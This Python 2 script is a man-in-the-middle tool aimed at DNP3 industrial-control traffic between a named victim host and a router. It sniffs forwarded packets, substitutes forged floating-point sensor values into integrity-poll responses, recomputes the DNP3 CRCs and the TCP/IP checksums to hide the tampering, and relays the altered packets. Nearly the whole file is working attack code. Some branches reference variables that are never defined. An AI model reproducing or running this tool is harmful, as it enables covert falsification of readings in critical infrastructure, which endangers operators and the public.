from bitstring import BitArray
from scapy.all import *
from uuid import getnode as get_mac
from calc_crc import calc_crc_chksum
from helpers import *
import argparse
import signal
import sys
import logging
import time
import stealthy_attack as attack

s = conf.L2socket(iface='eth0')
victimIP=""
routerIP=""
victimMAC=""
routerMAC=""
myMAC=""
interface=""
def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
	parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
	parser.add_argument("-vmac", "--victimMAC", help="Choose the victim MAC address. Example: -vmac 00:11:22:33:44:55")
	parser.add_argument("-rmac", "--routerMAC", help="Choose the router MAC address. Example: -rmac 11:22:33:44:55:66")
	parser.add_argument("-mmac", "--myMAC", help="my (attacker) MAC. Example: -mmac 11:22:33:44:55:66")
	parser.add_argument("-i", "--interface", help="interface to listen on Example: eth0")
	return parser.parse_args()

def callback(pkt):
	#modify packet here
	#print pkt.show()
        if("TCP" in pkt and "Raw" in pkt):
		#print pkt.show()
		if(pkt[TCP].sport==20000):
			payload = pkt[Raw].load
			#print "PAY LEN:"+str(len(payload))
			proceed=0
			value_dnp1=0
			if len(payload)==17:
					print "PAYLOAD DOES NOT HAVE ANY CHANGE DATA!"
			elif len(payload)>17 and attack.is_fpt_change(payload):
				# if floating point change is present we modify appropriately
				# We determine the location of the application chunks and CRCs
				crc_pos=crc_locations(payload)
				# In order to keep our analysis easy, we trim out the CRCs and calculate them later
				[trim_pyld,initial_pyld]=trim_crc(payload,crc_pos)
				# We now read the particular item we want to change and change it
				[value_hex,err]=get_item(5,trim_pyld)
				if not err:
					variable1=hex_to_float(value_flt)
					print "HERE'S THE VALUE:"+str(variable1)
				# We insert an arbitrary value for testing
				[trim_pyld,err]=attack.put_item(0,123.123,trim_pyld)
				if err:
					print "VALUE NOT FOUND AND NOT REPLACED"
				
				# When we are ready to join, we use this function to put things back together
				payload_joined=join_crc(trim_pyld,initial_pyld)
				
				# We just pass the payload on to the rest of the program for retransmission
				pkt[Raw].load=payload_new
				del pkt[IP].chksum
				del pkt[TCP].chksum
				del pkt[IP].len
				#fix seq number
				pkt[TCP].seq=pkt[TCP].seq - old_len + len(payload)
				
			elif len(payload)>200 and attack.is_integrity_poll(payload):
				# This is an integrity poll
				if (payload[0]== '\x05' and payload[1]=='\x64'):
					print "HIT1"
					index=50
					fd=open('packet_dump.txt','a')
					fd.write(payload)
					fd.close()		
					if (payload[193]=='\x01'and payload[191]== '\x1e' and payload[192]=='\x05'):
						print "HIT2"
						if payload[194]=='\x00' and payload[195]=='\x00':
							value_dnp1=payload[(199):(203)]
							value_test=value_dnp1
							value_dnp1=hex_to_float(value_dnp1)
							value_dnp2=payload[(204):(206)]+payload[208:210]
							value_dnp2=hex_to_float(value_dnp2)
							value_dnp3=payload[(211):(215)]
							value_dnp3=hex_to_float(value_dnp3)
							print "DECODED VALUE IS:"+str(value_dnp1)+"\nDECODED VALUE IS:"+str(value_dnp2)+"\nDECODED VALUE IS:"+str(value_dnp3)
							crc='\x00\x00'
							value_dnp1=42.6601
							old_crc=payload[206:208]
							value_attack=float_to_hex(value_dnp1)
							str1=payload[190:199]+float_to_hex(value_dnp1)+payload[203:206]
							print "VALUE_TEST:"+value_test.encode('hex')+"VALUE:"+value_attack.encode('hex')
							crc1 = calc_crc_chksum(str1)
							
							#print "OLD CRC:"+old_crc.encode('hex')+"NEW CRC:"+crc1.encode('hex')
							payload_new=payload[0:199]+value_attack+payload[203:206]+crc1+payload[208:len(payload)]
							print "LENGTH:"+str(len(payload_new))+"OLD_LENGTH:"+str(len(payload))
							old_len = len(payload)			
							pkt[Raw].load=payload_new
							del pkt[IP].chksum
							del pkt[TCP].chksum
							del pkt[IP].len
							#fix seq number
							pkt[TCP].seq=pkt[TCP].seq - old_len + len(payload)
	
	
	if pkt[IP].dst == victimIP and pkt.dst == myMAC:
		pkt.dst=victimMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)
	elif pkt[IP].dst == routerIP and pkt.dst == myMAC:
		pkt.dst=routerMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)

def main(args):
	if os.geteuid() != 0:
		sys.exit("[!] Please run as root")
	global routerIP
	global victimIP
	global routerMAC
	global victimMAC
	global myMAC
	global interface
	routerIP= args.routerIP
	victimIP = args.victimIP
	routerMAC = args.routerMAC
	victimMAC = args.victimMAC
	if(routerMAC == None):
		routerMAC = get_mac_from_ip(routerIP)
	if(victimMAC == None):
		victimMAC = get_mac_from_ip(victimIP)
	myMAC = args.myMAC
	if(myMAC == None):
		myMAC = get_my_mac()
	interface = args.interface
	if(interface == None):
		interface = "eth0"
	print "Forwarding for router ---> IP: "+routerIP+"  Mac Address: "+routerMAC
	print "Forwarding for victim ---> IP: "+victimIP+"  Mac Address: "+victimMAC+"\n"
	filter_text = "ip and ether dst host " + myMAC + " and(dst net " + victimIP  + " or dst net " + routerIP  + ")"
	sniff(filter=filter_text, prn=callback, store=0, iface=interface)
main(parse_args())



